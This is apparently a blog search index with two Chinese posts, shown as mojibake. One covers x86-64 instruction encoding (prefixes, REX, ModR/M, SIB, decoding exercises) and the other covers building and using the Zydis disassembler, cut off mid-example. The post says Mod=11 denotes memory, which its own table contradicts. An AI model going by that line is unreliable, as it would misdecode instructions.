<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>X86-64æ±‡ç¼–æœºå™¨ç æ ¼å¼</title>
      <link href="/posts/47eb1508.html"/>
      <url>/posts/47eb1508.html</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºæœ¬ç»“æ„">åŸºæœ¬ç»“æ„</h2><p><img src="https://s2.loli.net/2025/03/31/vEYwI5kGshboazd.png" alt="image-20250331153157959"></p><p><img src="https://s2.loli.net/2025/03/31/r9fHQj3BgMu1mDL.png" alt="image-20250331155123077"></p><p>è¯¥å›¾è¯´æ˜ï¼šä¸»æ“ä½œç ä¸€å®šæœ‰ï¼Œç”±äºå…¶å®ƒå†…å®¹ä¸ä¸€å®šåœ¨ä¸€æ¡æŒ‡ä»¤ä¸­ï¼Œæ‰€ä»¥æŒ‡ä»¤é•¿åº¦ä¸å›ºå®š</p><h3 id="ç¬¦å·è¯´æ˜">ç¬¦å·è¯´æ˜</h3><p>Gï¼šå¯„å­˜å™¨<br>Eï¼šå¯„å­˜å™¨/å†…å­˜<br>bï¼šå•å­—èŠ‚<br>vï¼šæ ¹æ®æ“ä½œç³»ç»Ÿåˆ¤æ–­ä½æ•°ï¼Œä¸€èˆ¬æ•°é»˜è®¤32ä½ï¼Œåœ°å€é»˜è®¤64ä½</p><p>MOV Gv Evï¼šæ„æ€æ˜¯æŠŠä¸€ä¸ªå†…å­˜æˆ–å¯„å­˜å™¨çš„å€¼æ”¾åˆ°ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œå¤§å°æ ¹æ®æ“ä½œç³»ç»Ÿå†³å®š</p><p>ç°åœ¨ä¾æ¬¡ä»‹ç»è¿™å‡ ä¸ª</p><h2 id="æŒ‡ä»¤å‰ç¼€ï¼ˆInstruction-Prefixesï¼‰">æŒ‡ä»¤å‰ç¼€ï¼ˆInstruction Prefixesï¼‰</h2><p>å‰ç¼€åˆ†ä¸º 4 ç±»ï¼Œä½¿ç”¨æ—¶ï¼Œä¸åŒºåˆ†å‰åé¡ºåºï¼Œä¸”æ¯ç»„æœ€å¤šå‡ºç°ä¸€ä¸ªï¼š</p><p>1.é”å®šå’Œé‡å¤å‰ç¼€</p><table><thead><tr><th>å‰ç¼€</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>F0</td><td>ä½¿æ“ä½œå˜ä¸ºåŸå­æ“ä½œ</td></tr><tr><td>F2</td><td>REPNE/REPNZï¼Œé‡å¤å‰ç¼€ï¼Œç”¨äºä¸²å’Œ IO</td></tr><tr><td>F3</td><td>REP æˆ– REPE/REPZï¼Œç”¨äºä¸²å’Œ IO</td></tr></tbody></table><p>2.æ®µé‡è½½</p><table><thead><tr><th>å‰ç¼€</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>2E</td><td>CS æ®µé‡è½½</td></tr><tr><td>36</td><td>SS æ®µé‡è½½</td></tr><tr><td>3E</td><td>DS æ®µé‡è½½</td></tr><tr><td>26</td><td>ES æ®µé‡è½½</td></tr><tr><td>64</td><td>FS æ®µé‡è½½</td></tr><tr><td>65</td><td>GS æ®µé‡è½½</td></tr><tr><td>2E</td><td>åˆ†æ”¯ä¸€èˆ¬ä¸è·³è½¬ï¼Œç”¨äºæç¤º CPU è¿›è¡Œé¢„æµ‹</td></tr><tr><td>3E</td><td>åˆ†æ”¯ä¸€èˆ¬è·³è½¬ï¼Œç”¨äºæç¤º CPU è¿›è¡Œé¢„æµ‹</td></tr></tbody></table><p>3.æ“ä½œæ•°å¤§å°é‡è½½</p><table><thead><tr><th>å‰ç¼€</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>66</td><td>å°†é»˜è®¤æ“ä½œæ•°å¤§å°ä» 32 ä½è½¬ä¸º 16 ä½</td></tr></tbody></table><p>4.æ“ä½œåœ°å€å¤§å°é‡è½½</p><table><thead><tr><th>å‰ç¼€</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>67</td><td>å°†é»˜è®¤çš„ 64 ä½åœ°å€å¤§å°è½¬ä¸º 32 ä½</td></tr></tbody></table><h2 id="REX-å‰ç¼€">REX å‰ç¼€</h2><p>REX ç”¨æ¥æ‰©å±•æŒ‡ä»¤ä» 32 ä½åˆ° 64 ä½ï¼Œè¿™ä¸€éƒ¨åˆ†çš„å†…å®¹éœ€è¦å…ˆçœ‹åé¢çš„å‡ ä¸ªéƒ¨åˆ†æ‰èƒ½çœ‹æ‡‚</p><p>å ä¸€å­—èŠ‚ï¼Œå¯ä»¥æ²¡æœ‰</p><p><img src="https://s2.loli.net/2025/03/31/uBJv1dEkf8NXGpD.png" alt="image-20250331160405462"></p><p>å°†å¯¹åº”åŸŸç½® 1 å°±å¯ä»¥ä½¿ç›®æ ‡æ‰©å±•</p><p>å…¶ä¸­ç»å¸¸ä½¿ç”¨çš„å°±æ˜¯ 48ï¼Œè®©æ“ä½œæ•°å˜ä¸º 64 ä½å¤§å°</p><h2 id="æ“ä½œç ">æ“ä½œç </h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œä¸»æ“ä½œç é•¿åº¦ä¸º 1 åˆ° 3 å­—èŠ‚ï¼ŒModR/M å¯èƒ½ç¼–ç é™„åŠ çš„ 3 ä½æ“ä½œç </p><p>åŒå­—èŠ‚ï¼š0F+ç¬¬äºŒä¸ªæ“ä½œç å­—èŠ‚ æˆ– ä¸€ä¸ªå‰ç¼€(66H, F2H, æˆ– F3H)+0F+ç¬¬äºŒä¸ªæ“ä½œç å­—èŠ‚<br>ä¸‰å­—èŠ‚ï¼š0F+åä¸¤ä¸ªæ“ä½œç å­—èŠ‚ æˆ– ä¸€ä¸ªå‰ç¼€(66H, F2H, æˆ– F3H)+0F+åä¸¤ä¸ªæ“ä½œç å­—èŠ‚</p><p>éƒ¨åˆ†å†…å®¹éœ€è¦å…ˆçœ‹åé¢çš„</p><p>ä¸‹é¢ä¸º 1 åˆ° 3 å­—èŠ‚æŒ‡ä»¤çš„æŸ¥è¡¨</p><p><img src="https://s2.loli.net/2025/03/31/JqnVpF7uomvaj4L.png" alt="image-20250331161314311"></p><p><img src="https://s2.loli.net/2025/03/31/LFVOx9YB4whqlIG.png" alt="image-20250331161329868"></p><p><img src="https://s2.loli.net/2025/03/31/y35PrtfsOdVNcZi.png" alt="image-20250331161339920"></p><p><img src="https://s2.loli.net/2025/03/31/MRiwKW1ZmSj83GQ.png" alt="image-20250331161350193"></p><p><img src="https://s2.loli.net/2025/03/31/hTMljvS2V6nPRXW.png" alt="image-20250331161359418"></p><p><img src="https://s2.loli.net/2025/03/31/rogQINylSKYHLJ3.png" alt="image-20250331161408747"></p><p><img src="https://s2.loli.net/2025/03/31/Ax95rqsP4VI3fNc.png" alt="image-20250331161419001"></p><p><img src="https://s2.loli.net/2025/03/31/LhElcWowv7MtYCi.png" alt="image-20250331161429738"></p><p><img src="https://s2.loli.net/2025/03/31/dDWFZ32bXHqLgQr.png" alt="image-20250331161439214"></p><p><img src="https://s2.loli.net/2025/03/31/sOSoX6rl5MiTzPf.png" alt="image-20250331161448469"></p><blockquote><p>ä»¥ä¸Šæˆªå–è‡ª IA32 æ‰‹å†Œ 2024-12 ç‰ˆçš„ 2929 é¡µè‡³ 2938 é¡µ</p></blockquote><p>é™¤äº†ä¸Šé¢çš„æŸ¥è¡¨æ–¹å¼ï¼Œx86-64 æŒ‡ä»¤è¿˜æœ‰å¦ä¸€ç§æ–¹å¼ï¼šé€šè¿‡ç»„æ¥æŸ¥è¯¢ï¼Œè¿™ç§æ–¹å¼ä½¿ç”¨äº†ä¸€å¼ æ–°è¡¨ï¼Œå«åšå•åŒå­—èŠ‚æ“ä½œç çš„æ“ä½œç æ‰©å±•</p><p>å…ˆé™„è¡¨</p><p><img src="https://s2.loli.net/2025/03/31/v3guPoV9xBY4HcI.png" alt="image-20250331163515951"></p><p><img src="https://s2.loli.net/2025/03/31/PflMsu9DHAa65Sg.png" alt="image-20250331163526702"></p><p><img src="https://s2.loli.net/2025/03/31/AWFud91GmSMNsYQ.png" alt="image-20250331165953065"></p><p><img src="https://s2.loli.net/2025/03/31/QaphGj7wUt8bKYs.png" alt="image-20250331170007852"></p><p><img src="https://s2.loli.net/2025/03/31/qKaURr7v9ew54cm.png" alt="image-20250331170031403"></p><p><img src="https://s2.loli.net/2025/03/31/ijDMHZgbCTVLUoQ.png" alt="image-20250331170044132"></p><p><img src="https://s2.loli.net/2025/03/31/glzF7n1DKhGYrE5.png" alt="image-20250331170056390"></p><p><img src="https://s2.loli.net/2025/03/31/tmDh75EdeKa93TC.png" alt="image-20250331170105301"></p><p><img src="https://s2.loli.net/2025/03/31/8ygvpfUW5sFHcMC.png" alt="image-20250331170116327"></p><p><img src="https://s2.loli.net/2025/03/31/9lIOjfepRrqGBLm.png" alt="image-20250331170126623"></p><p><img src="https://s2.loli.net/2025/03/31/2vhJ5iNDqRBG8bK.png" alt="image-20250331170135362"></p><p><img src="https://s2.loli.net/2025/03/31/STFlRIhLdAKUjnQ.png" alt="image-20250331170145112"></p><p><img src="https://s2.loli.net/2025/03/31/Mb8p9NrtxkF6imv.png" alt="image-20250331170154414"></p><p><img src="https://s2.loli.net/2025/03/31/2xaMiUDeQIPEln6.png" alt="image-20250331170205007"></p><p><img src="https://s2.loli.net/2025/03/31/2ICDLpAyMuXohHZ.png" alt="image-20250331170213809"></p><p><img src="https://s2.loli.net/2025/03/31/zChIJxtd6SDjqVQ.png" alt="image-20250331170226577"></p><p><img src="https://s2.loli.net/2025/03/31/ws6iqjJzf127Ktm.png" alt="image-20250331170241767"></p><p><img src="https://s2.loli.net/2025/03/31/v8ltPzSd52j1CxF.png" alt="image-20250331170254243"></p><blockquote><p>è¿™é‡Œæ˜¯ 2940 åˆ° 2950</p></blockquote><p>è€ƒè™‘ 80 C0 05</p><p>80 åœ¨è¡¨ A-6 ä¸­æ˜¯ Group 1ï¼Œç„¶åçœ‹ ModR/M å­—æ®µçš„ 5ï¼Œ4ï¼Œ3 ä½<br>C0:11000000ï¼Œ5ï¼Œ4ï¼Œ3 ä½ä¸º 000ï¼Œå³ 0ï¼ŒæŸ¥çºµåˆ—å¾— ADDï¼Œæ ¹æ®ä¹‹åçš„å†…å®¹å¯ä»¥çŸ¥é“ ModR/M æŒ‡å®šäº†å¯¹åº”çš„å†…å­˜å’Œå¯„å­˜å™¨ï¼Œæ‰€ä»¥å¾—åˆ° add al,5ï¼Œè¿™å’Œç¬¬ä¸€ç§ç›´æ¥æŸ¥è¡¨å¾—åˆ°çš„ 0405 çš„æŒ‡ä»¤ç›¸åŒ</p><h2 id="ModR-M">ModR/M</h2><p>å¦‚æœä¸€ä¸ªæ“ä½œç æ¶‰åŠå†…å­˜ï¼Œåé¢ä¸€èˆ¬å°±ä¼šæœ‰ä¸€ä¸ªå¯»å€æ ¼å¼è¯´æ˜å­—èŠ‚å³ ModR/Mï¼Œè€Œå¦‚æœ ModR/M ä¸­æåˆ°äº†éœ€è¦å†…å­˜å¯»å€ï¼Œé‚£ä¹ˆå°±éœ€è¦ SIB å­—èŠ‚å»è¿›ä¸€æ­¥è§£é‡Š</p><p>ModR/Må’ŒSIBå„æ¶‰åŠä¸‰ä¸ªåŸŸï¼š<br><img src="https://s2.loli.net/2025/03/31/RadXi6T4VHcKSOJ.png" alt="image-20250331171513102"></p><p><img src="https://s2.loli.net/2025/03/31/ZY7RDy4MJorbdUv.png" alt="image-20250331172923245"></p><h3 id="Modå¯»å€æ¨¡å¼">Modå¯»å€æ¨¡å¼</h3><p>æŒ‡æ˜æ“ä½œç ä¸­çš„Eæ˜¯å¯„å­˜å™¨è¿˜æ˜¯å†…å­˜ï¼Œ11æ˜¯å†…å­˜ï¼Œå…¶å®ƒéƒ½æ˜¯å¯„å­˜å™¨</p><table><thead><tr><th>Modå€¼</th><th>æè¿°</th><th>åç§»é‡</th></tr></thead><tbody><tr><td>00</td><td>å†…å­˜ï¼Œæ— åç§»é‡(é™¤é R/M=101)</td><td>æ— æˆ–32</td></tr><tr><td>01</td><td>å†…å­˜ï¼Œæœ‰8ä½åç§»</td><td>[base+8ä½åç§»]</td></tr><tr><td>10</td><td>å†…å­˜ï¼Œæœ‰32ä½åç§»</td><td>[base+32 ä½åç§»]</td></tr><tr><td>11</td><td>å¯„å­˜å™¨æ“ä½œæ•°</td><td>å¯„å­˜å™¨</td></tr></tbody></table><p>å‰ä¸‰ä¸ªä¸ºå†…å­˜ï¼Œåä¸€ä¸ªä¸ºæ•°</p><h3 id="Reg-Opcodeå¯„å­˜å™¨æˆ–æ“ä½œç æ‰©å±•">Reg/Opcodeå¯„å­˜å™¨æˆ–æ“ä½œç æ‰©å±•</h3><p>æŒ‡å®šä½¿ç”¨çš„regæˆ–opcodeæ‰©å±•ï¼š</p><table><thead><tr><th style="text-align:left">å€¼</th><th style="text-align:left">32 ä½å¯„å­˜å™¨</th><th style="text-align:left">16 ä½å¯„å­˜å™¨</th><th style="text-align:left">8 ä½å¯„å­˜å™¨</th><th style="text-align:left">ç”¨é€” (æ“ä½œç æ‰©å±•)</th></tr></thead><tbody><tr><td style="text-align:left">000</td><td style="text-align:left">EAX</td><td style="text-align:left">AX</td><td style="text-align:left">AL</td><td style="text-align:left">ADD</td></tr><tr><td style="text-align:left">001</td><td style="text-align:left">ECX</td><td style="text-align:left">CX</td><td style="text-align:left">CL</td><td style="text-align:left">OR</td></tr><tr><td style="text-align:left">010</td><td style="text-align:left">EDX</td><td style="text-align:left">DX</td><td style="text-align:left">DL</td><td style="text-align:left">ADC</td></tr><tr><td style="text-align:left">011</td><td style="text-align:left">EBX</td><td style="text-align:left">BX</td><td style="text-align:left">BL</td><td style="text-align:left">SBB</td></tr><tr><td style="text-align:left">100</td><td style="text-align:left">ESP</td><td style="text-align:left">SP</td><td style="text-align:left">AH</td><td style="text-align:left">AND</td></tr><tr><td style="text-align:left">101</td><td style="text-align:left">EBP</td><td style="text-align:left">BP</td><td style="text-align:left">CH</td><td style="text-align:left">SUB</td></tr><tr><td style="text-align:left">110</td><td style="text-align:left">ESI</td><td style="text-align:left">SI</td><td style="text-align:left">DH</td><td style="text-align:left">XOR</td></tr><tr><td style="text-align:left">111</td><td style="text-align:left">EDI</td><td style="text-align:left">DI</td><td style="text-align:left">BH</td><td style="text-align:left">CMP</td></tr></tbody></table><h3 id="R-Må¯„å­˜å™¨æˆ–å†…å­˜">R/Må¯„å­˜å™¨æˆ–å†…å­˜</h3><table><thead><tr><th style="text-align:left">R/M å€¼</th><th style="text-align:left">Mod = 11ï¼ˆå¯„å­˜å™¨ï¼‰</th><th style="text-align:left">Mod â‰  11ï¼ˆå†…å­˜åŸºå€/ç´¢å¼•ï¼‰</th></tr></thead><tbody><tr><td style="text-align:left">000</td><td style="text-align:left">EAX</td><td style="text-align:left">[RAX]</td></tr><tr><td style="text-align:left">001</td><td style="text-align:left">ECX</td><td style="text-align:left">[RCX]</td></tr><tr><td style="text-align:left">010</td><td style="text-align:left">EDX</td><td style="text-align:left">[RDX]</td></tr><tr><td style="text-align:left">011</td><td style="text-align:left">EBX</td><td style="text-align:left">[RBX]</td></tr><tr><td style="text-align:left">100</td><td style="text-align:left">ESP</td><td style="text-align:left">[SIB]ï¼ˆéœ€è¦ SIB å­—èŠ‚ï¼‰</td></tr><tr><td style="text-align:left">101</td><td style="text-align:left">EBP</td><td style="text-align:left">[RBP] æˆ–æ— åç§»/disp32</td></tr><tr><td style="text-align:left">110</td><td style="text-align:left">ESI</td><td style="text-align:left">[RSI]</td></tr><tr><td style="text-align:left">111</td><td style="text-align:left">EDI</td><td style="text-align:left">[RDI]</td></tr></tbody></table><p>å†…å­˜ç´¢å¼•çš„æ ‡å‡†æ ¼å¼ï¼š<code>base+index*scale+disp</code></p><h2 id="SIB">SIB</h2><p>SIBç”¨æ¥ç¡®å®šå…·ä½“çš„åœ°å€æ ¼å¼<br>å¦‚æœModR/Mä¸­Modä¸ä¸º11ï¼Œä¸”R/Mçš„å€¼ä¸º100ï¼Œåˆ™åä¸€ä¸ªå­—èŠ‚ä¸ºSIB</p><p>ModR/Må’ŒSIBå„æ¶‰åŠä¸‰ä¸ªåŸŸï¼š<br><img src="https://s2.loli.net/2025/03/31/RadXi6T4VHcKSOJ.png" alt="image-20250331171513102"></p><p><img src="https://s2.loli.net/2025/03/31/bTHXZd9BnIeYQMw.png" alt="image-20250331190129120"></p><h3 id="Scaleæ¯”ä¾‹å› å­">Scaleæ¯”ä¾‹å› å­</h3><p>å†³å®šç´¢å¼•å¯„å­˜å™¨å€¼çš„å€æ•°</p><table><thead><tr><th>å€¼</th><th>æ¯”ä¾‹å› å­ (Scale)</th></tr></thead><tbody><tr><td>00</td><td>1</td></tr><tr><td>01</td><td>2</td></tr><tr><td>10</td><td>4</td></tr><tr><td>11</td><td>8</td></tr></tbody></table><h3 id="Indexç´¢å¼•å¯„å­˜å™¨">Indexç´¢å¼•å¯„å­˜å™¨</h3><table><thead><tr><th>å€¼</th><th>å¯„å­˜å™¨ (64 ä½æ¨¡å¼)</th><th>å¯„å­˜å™¨ (32 ä½æ¨¡å¼)</th></tr></thead><tbody><tr><td>000</td><td>RAX</td><td>EAX</td></tr><tr><td>001</td><td>RCX</td><td>ECX</td></tr><tr><td>010</td><td>RDX</td><td>EDX</td></tr><tr><td>011</td><td>RBX</td><td>EBX</td></tr><tr><td>100</td><td>æ— ç´¢å¼•å¯„å­˜å™¨</td><td>æ— ç´¢å¼•å¯„å­˜å™¨</td></tr><tr><td>101</td><td>RBP</td><td>EBP</td></tr><tr><td>110</td><td>RSI</td><td>ESI</td></tr><tr><td>111</td><td>RDI</td><td>EDI</td></tr></tbody></table><h3 id="BaseåŸºå€å¯„å­˜å™¨">BaseåŸºå€å¯„å­˜å™¨</h3><table><thead><tr><th>å€¼</th><th>å¯„å­˜å™¨ (64 ä½æ¨¡å¼)</th><th>å¯„å­˜å™¨ (32 ä½æ¨¡å¼)</th></tr></thead><tbody><tr><td>000</td><td>RAX</td><td>EAX</td></tr><tr><td>001</td><td>RCX</td><td>ECX</td></tr><tr><td>010</td><td>RDX</td><td>EDX</td></tr><tr><td>011</td><td>RBX</td><td>EBX</td></tr><tr><td>100</td><td>RSPï¼ˆéœ€ SIB æ‰©å±•ï¼‰</td><td>ESPï¼ˆéœ€ SIB æ‰©å±•ï¼‰</td></tr><tr><td>101</td><td>RBP æˆ– disp32(Mod=00)</td><td>EBP æˆ– disp32(Mod=00)</td></tr><tr><td>110</td><td>RSI</td><td>ESI</td></tr><tr><td>111</td><td>RDI</td><td>EDI</td></tr></tbody></table><h2 id="ç»ƒä¹ ">ç»ƒä¹ </h2><p>8B 41 10</p><p>8Bå¯¹åº”MOV Gv Ev</p><p>Gvè¯´æ˜ç›®æ ‡æ“ä½œæ•°æ˜¯å¯„å­˜å™¨ï¼ŒEvè¡¨ç¤ºæºæ“ä½œæ•°ä¸ºå¯„å­˜å™¨æˆ–åœ°å€<br>41æ˜¯ModR/M<br>01 000 001<br>01è¯´æ˜è¿™ä¸ªæŒ‡ä»¤çš„åœ°å€Evä¸ºå†…å­˜åœ°å€ä¸”æœ‰8bitåç§»ï¼Œ000è¯´æ˜Gvä¸ºAXç±»ï¼Œ001è¯´æ˜ç›®æ ‡æ“ä½œæ•°ä¸ºCXç±»<br>ç”±äºæ²¡æœ‰SIBï¼Œ10ä¸ºç«‹å³æ•°</p><p>æ‰€ä»¥æŒ‡ä»¤ä¸ºï¼šMOV EAX, [RCX+0x10]</p><hr><p>04 FF</p><p>04å¯¹åº”ADD AL,Lb</p><p>å·²ç»æŒ‡å®šå¯„å­˜å™¨ï¼Œåé¢ç›´æ¥è·Ÿç«‹å³æ•°ï¼ŒLbè¡¨æ˜æ˜¯ä¸€ä¸ªbyteï¼Œæ‰€ä»¥æ˜¯ADD AL ,0xff</p><hr><p>67 FF 34 88</p><p>67ä¸ºæŒ‡ä»¤å‰ç¼€ï¼Œè¡¨æ˜æŠŠä¹‹åçš„åœ°å€å€¼è½¬ä¸º32ä½<br>FFè¡¨æ˜è¦å»Grp $5^{1A}$<br>34ä¸ºModR/Mï¼š00 110 100å¾—åˆ°æŒ‡ä»¤æ˜¯PUSH Ev<br>00è¡¨æ˜ä¸ºä½¿ç”¨åœ°å€æ— åç§»ï¼Œ100è¡¨ç¤ºæ ¹æ®SIBç¡®å®šåœ°å€çš„å€¼</p><p>SIBï¼š10 001 000</p><p>10è¡¨æ˜æ¯”ä¾‹å› å­ä¸º4ï¼Œ001è¡¨æ˜ç´¢å¼•å¯„å­˜å™¨ä¸ºRCXï¼Œ000è¡¨æ˜åŸºå€å¯„å­˜å™¨ä¸ºRAX</p><p>æ ¹æ®æŒ‡ä»¤å‰ç¼€ï¼Œå°†åœ°å€ç›¸å…³å¯„å­˜å™¨å¤§å°è½¬ä¸º32ä½ï¼špush qword ptr [eax+ecx*4]</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨ç  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zydisåç¼–è¯‘åº“ç¼–è¯‘åŠä½¿ç”¨æ–¹å¼</title>
      <link href="/posts/cbdd2395.html"/>
      <url>/posts/cbdd2395.html</url>
      
        <content type="html"><![CDATA[<p>Zydisæ˜¯ä¸€ä¸ªåæ±‡ç¼–åº“ï¼Œå¯ä»¥è§£ææœºå™¨æŒ‡ä»¤å°†å…¶è½¬ä¸ºæ±‡ç¼–ä»£ç ï¼Œä¸‹é¢æ˜¯ä½¿ç”¨æ–¹æ³•</p><h2 id="ä¸‹è½½">ä¸‹è½½</h2><p><a href="https://github.com/zyantific/zydis">zyantific/zydis: Fast and lightweight x86/x86-64 disassembler and code generation library</a></p><p>å¯ä»¥ç›´æ¥ä¸‹è½½releasesä¹Ÿå¯ä»¥ç›´æ¥clone</p><h2 id="ç¼–è¯‘">ç¼–è¯‘</h2><p>æ ‡å‡†çš„ç¼–è¯‘æ–¹æ³•ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone </span>--recursive <span class="string">&#x27;https://github.com/zyantific/zydis.git&#x27;</span></span><br><span class="line">cd zydis</span><br><span class="line">cmake -<span class="keyword">B </span><span class="keyword">build</span></span><br><span class="line"><span class="keyword"></span>cmake --<span class="keyword">build </span><span class="keyword">build </span>-<span class="keyword">j4</span></span><br></pre></td></tr></table></figure><h2 id="é…ç½®">é…ç½®</h2><p>å¦‚æœä½¿ç”¨çš„æ˜¯msvcï¼Œå¯ä»¥ç›´æ¥è¿›å…¥msvcç›®å½•ä½¿ç”¨vsç¼–è¯‘ï¼Œé…ç½®ä¸ºrelease MTï¼Œç›´æ¥ç”Ÿæˆã€‚</p><p>å¦‚æœæ˜¯ä¸Šé¢çš„æ–¹æ³•ï¼Œè¾“å‡ºæ–‡ä»¶åœ¨buildæ–‡ä»¶çš„debugç›®å½•ä¸‹å’ŒZycore\debugç›®å½•ï¼Œå¦‚æœæ˜¯ä¸‹é¢çš„æ–¹æ³•ï¼Œè¾“å‡ºæ–‡ä»¶åœ¨bin\releaseX64ä¸‹</p><p>å–å¾—ç”Ÿæˆçš„Zydis.libå’ŒZycore.libï¼Œæ”¾åœ¨é¡¹ç›®ç›®å½•çš„libæ–‡ä»¶å¤¹ä¸‹(æ–°å»º)ï¼Œç„¶ååœ¨æœ€å¤–é¢çš„zydisç›®å½•ä¸‹æ‰¾åˆ°includeå¤åˆ¶åˆ°é¡¹ç›®æ–‡ä»¶å¤¹ï¼Œåœ¨dependencies\zycoreä¸‹æ‰¾åˆ°includeæ–‡ä»¶å¤¹å¤åˆ¶åˆ°é¡¹ç›®æ–‡ä»¶å¤¹</p><p>åœ¨é¡¹ç›®å±æ€§ä¸­ï¼š</p><ul><li>C/C++<ul><li>å¸¸è§„ï¼šé™„åŠ åŒ…å«ç›®å½•æ·»åŠ ï¼š$(ProjectDir)include</li><li>é¢„å¤„ç†å™¨ï¼šé¢„å¤„ç†å™¨å®šä¹‰æ·»åŠ ï¼šZYDIS_STATIC_DEFINE</li></ul></li><li>é“¾æ¥å™¨<ul><li>å¸¸è§„ï¼šé™„åŠ åº“ç›®å½•åŒ…å«æ·»åŠ ï¼š$(ProjectDir)lib</li><li>è¾“å…¥ï¼šé™„åŠ ä¾èµ–é¡¹æ·»åŠ ï¼šZycore.lib;Zydis.lib</li></ul></li></ul><h2 id="å†™ä»£ç ">å†™ä»£ç </h2><p>å¼•ç”¨å¤´æ–‡ä»¶ï¼š<code>#include &lt;Zydis/Zydis.h&gt;</code></p><h2 id="è§£æå™¨">è§£æå™¨</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ZydisDecoderDecodeFull</span>(&amp;decoder, buffer.<span class="built_in">data</span>() + offset, length - offset,&amp;instruction, operands)</span><br></pre></td></tr></table></figure><p>decoderæ˜¯ZydisDecoderç±»å‹<br>instructionæ˜¯ZydisDecodedInstructionä¿å­˜åŸºæœ¬æŒ‡ä»¤æ•°æ®<br>operandsæ˜¯ZydisDecodedOperandç±»å‹æ•°ç»„ï¼Œä¿å­˜ä¸€æ¡æŒ‡ä»¤çš„æ“ä½œæ•°</p><p>dataæ˜¯å­˜æ”¾æœºå™¨ç çš„ç¼“å†²åŒº</p><p>æ¯æ¬¡æ‰§è¡Œä¸€æ¬¡è¿™ä¸ªæŒ‡ä»¤ï¼Œå°±ä¼šå¯¹instructionå’Œoperandsèµ‹å€¼ï¼Œè¡¨ç¤ºä¸€æ¡æŒ‡ä»¤çš„è§£æ</p><ul><li>instruction.mnemonic   åŠ©è®°ç¬¦</li><li>instruction.length    æŒ‡ä»¤æ€»é•¿åº¦</li><li>instruction.opcode    æœºå™¨ç </li><li>instruction.operand_count_visible    æ˜¾å¼æ“ä½œæ•°æ•°é‡</li><li>operand.type    è¿™ä¸ªæ“ä½œæ•°çš„ç±»å‹<ul><li>ç«‹å³æ•°(ZYDIS_OPERAND_TYPE_IMMEDIATE):<br>operand.imm.valueæ•°å€¼</li><li>å¯„å­˜å™¨(ZYDIS_OPERAND_TYPE_REGISTER):<br>operand.reg.valueå¯„å­˜å™¨åç§°</li><li>å†…å­˜åœ°å€(ZYDIS_OPERAND_TYPE_MEMORY):<br>operand.mem.baseè¡¨ç¤ºå†…å­˜çš„åŸºå€å¯„å­˜å™¨<br>operand.mem.indexè¡¨ç¤ºç´¢å¼•å¯„å­˜å™¨<br>operand.mem.dispåœ°å€åç§»å€¼</li></ul></li></ul><p>ä½¿ç”¨æ¨¡æ¿å¯ä»¥å‚è€ƒexampleå’Œä¸‹é¢è¿™ä¸ª</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cinttypes&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 